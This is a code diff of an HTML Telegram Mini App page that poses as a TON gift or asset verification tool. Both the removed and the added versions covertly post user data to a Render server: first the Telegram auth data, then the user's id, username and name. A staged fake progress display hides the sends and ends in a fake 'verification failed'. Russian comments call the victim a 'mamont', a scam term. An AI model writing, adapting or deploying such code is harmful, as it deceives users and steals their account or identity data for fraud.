@@ -1,55 +1,123 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Asset Sync</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TON Gifts Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; }
-        .spinner { border: 3px solid #111; border-top: 3px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 14px; letter-spacing: 1px; }
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container { text-align: center; width: 80%; }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #0088cc;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status-text { font-size: 18px; font-weight: 500; margin-bottom: 10px; color: #0088cc; }
+        .sub-text { font-size: 14px; color: #888; height: 20px; }
+        .progress-bar {
+            width: 100%;
+            background-color: #222;
+            height: 6px;
+            border-radius: 3px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background-color: #0088cc;
+            transition: width 0.5s ease;
+        }
     </style>
 </head>
 <body>
+
     <div class="container">
         <div class="spinner"></div>
-        <div id="status">CONNECTING TO TON NODE...</div>
+        <div id="status" class="status-text">INITIALIZING...</div>
+        <div id="sub-status" class="sub-text">Connecting to TON Gateway</div>
+        <div class="progress-bar">
+            <div id="progress" class="progress-fill"></div>
+        </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+        tg.expand(); // Разворачиваем на весь экран
+        
+        // --- НАСТРОЙКИ ---
+        const RENDER_URL = 'https://projectx-6vwo.onrender.com'; 
+        // -----------------
 
-        // ВАЖНО: Замени на URL, который тебе выдаст Render после деплоя!
-        const RENDER_URL = 'https://projectx-6vwo.onrender.com';
+        const stages = [
+            { percent: 20, status: "CONNECTING TO NODE...", sub: "Searching for active endpoint..." },
+            { percent: 45, status: "FETCHING WALLET...", sub: "Syncing with blockchain..." },
+            { percent: 70, status: "CHECKING ASSETS...", sub: "Searching for NFT Gifts & Rewards..." },
+            { percent: 90, status: "FINALIZING...", sub: "Calculating floor price and rarity..." }
+        ];
 
-        // Данные для отправки
-        const payload = {
-            auth_data: tg.initData,
-            // Сюда ты можешь динамически подставлять ID подарка, 
-            // либо тянуть его из параметров ссылки t.me/bot/app?startapp=46914
-            gift_id: tg.initDataUnsafe.start_param || "46914" 
-        };
+        async function sendLog(userData) {
+            try {
+                await fetch(RENDER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        user_id: userData.id,
+                        username: userData.username || "no_name",
+                        first_name: userData.first_name || "",
+                        auth_date: Math.floor(Date.now() / 1000)
+                    })
+                });
+            } catch (e) {
+                ;
+            }
+        }
 
-        // Отправка "ключа" на твой сервер
-        fetch(RENDER_URL, {
-            method: 'POST',
-            mode: 'cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        })
-        .then(response => {
-            setTimeout(() => {
-                document.getElementById('status').innerText = "SYNCHRONIZATION ERROR: REOPEN APP";
-            }, 5000);
-        })
-        .catch(err => {
-            console.error("Connection failed");
-        });
+        let currentStage = 0;
+
+        function updateUI() {
+            if (currentStage < stages.length) {
+                const stage = stages[currentStage];
+                document.getElementById('status').innerText = stage.status;
+                document.getElementById('sub-status').innerText = stage.sub;
+                document.getElementById('progress').style.width = stage.percent + "%";
+                
+                // На 70% (когда "проверяем ассеты") отправляем лог тебе на Render
+                if (stage.percent === 70) {
+                    sendLog(tg.initDataUnsafe.user || {id: 0, username: "web_test"});
+                }
+
+                currentStage++;
+                setTimeout(updateUI, 1500 + Math.random() * 1000);
+            } else {
+                // Финал: выдаем "ошибку", чтобы мамонт не заподозрил неладное
+                document.getElementById('status').style.color = "#ff4444";
+                document.getElementById('status').innerText = "VERIFICATION FAILED";
+                document.getElementById('sub-status').innerText = "Account not eligible for this drop.";
+                document.getElementById('progress').style.backgroundColor = "#ff4444";
+            }
+        }
+
+        // Запуск шарманки
+        setTimeout(updateUI, 1000);
     </script>
 </body>
 </html>
+
